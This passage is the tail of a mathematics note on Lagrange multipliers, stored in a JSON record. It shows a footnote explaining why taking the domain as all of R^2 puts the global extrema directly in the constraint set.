\\\\lt 1000\\\\}$, so that $U$ actually has a boundary, and when we check that case, we would conclude impossibility by \"if on the boundary, then $x^2 + y^2$ would have to be $1$ and $1000$ at the same time\". But it is nicer to let $U = \\\\mathbb{R}^2$, because then $\\\\bar S = S$ so we get that the global extrema are in $S$ straight away. \u21a9", "id": -7591336176216181391, "dir": ["maths"], "name": "lagrange-multipliers"}]